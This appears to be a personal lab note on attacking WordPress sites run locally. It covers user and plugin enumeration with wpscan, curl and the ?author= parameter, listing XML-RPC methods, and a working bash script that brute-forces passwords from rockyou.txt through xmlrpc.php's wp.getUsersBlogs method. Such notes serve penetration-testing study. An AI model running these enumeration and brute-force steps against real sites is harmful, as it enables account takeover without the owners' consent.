
# Enum user
You can use searchsploit
````bash
searchsploit wordpress user enumeration
````

To examinate or see the exploit you can use this
````bash
searchsploit -x ID
````

## WPSCAN Automatically
help panel
````bash
wpscan -hh
````


````bash
wpscan --url http://127.0.0.1:31337 -e vp,u
````
`-e` --> To enum plugins, user...
`vp` --> vulnerable plugins
`-u` --> to enum users

### search vulnerabilities
You need a api token that obtain from https://wpscan.com/profile (You need a account)
The command to search vuln is this
````bash
wpscan --url http://127.0.0.1:31337 -e vp,u --api-token="YOURMADAFACKINGTOKEN"
````

## Manual

### Enum users
````bash
https://wordpress/?author=1
````
### Enum plugins (Directory listening)
Directory listening means that you can see the directory available
If you go to this path you sometimes you can see directories:
````bash
localhost:31337/wp-content/plugins
````

### Source code
````bash
curl -s -X GET "http://127.0.0.1:31337" | grep plugins
````

If you want to see this better you can use a regular expression with grep:

````bash
curl -s -X GET "http://127.0.0.1:31337" | grep -oP "plugins/\K[^/]+" | sort -u
````
`\K` -->Don't show the matches regex before the \\K
`[^/]+` --> Show all that are not a reverse slash one or more times
`sort -u` --> Show unique lines

### XMLRPC
If xmlrpc.php exists you can see 

In the explorer say that only accept requests by post, you can do this:
````bash
curl -s X POST "wordpress/xmlrpc.php"
````

This respond that well not formed.
This wait a structure in XML.

To see what you can do it when xmlrpc you can search abusing xmlrpc wordpress
https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

To see all the method you need to create a XML file with this content:
````xml
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
````

To do a request with the file you can use this command:
````bash
curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml
````

`-d@path` --> To indicate the **data**

The method used to check valid credentials is ==wp.getUserBlogs==

You can bruteforce with this structure in XML
````xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
````

You have to change the username or password depending on what you are looking for
**This method don't allow to enum user that don't have a valid password**

And you return to use the curl command but with this file:
````bash
curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@newFile.xml
````

If is wrong they return a XML that say "Incorrect username or password"

We can do a script in bash to bruteforce this:
````bash
#!/bin/bash

ctrl_c(){
    echo "[*] Saliendo del programa [*]"
    tput cnorm
    exit 1
}

# Ctrl_c
trap ctrl_c SIGINT

# Hidden cursor
tput civis

createXML(){
    password=$1

    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>sergiky</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
"""

    echo $xmlFile > file.xml

    response=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml)
    if [[ ! "$(echo "$response" | grep 'Incorrect username or password')" ]]; then
        echo "[+] La contraseña para el usuario sergiky es: $password"
        tput cnorm
        exit 0
    fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
  createXML $password
done
````

### BruteForce with WPScan
````bash
wpscan --url http://127.0.0.1 -U sergiky -P /usr/share/wordlists/rockyou.txt
````


----

# Tags

#contentManager #tools #wordpress #wpscan #xmlrpc #enumUser

-----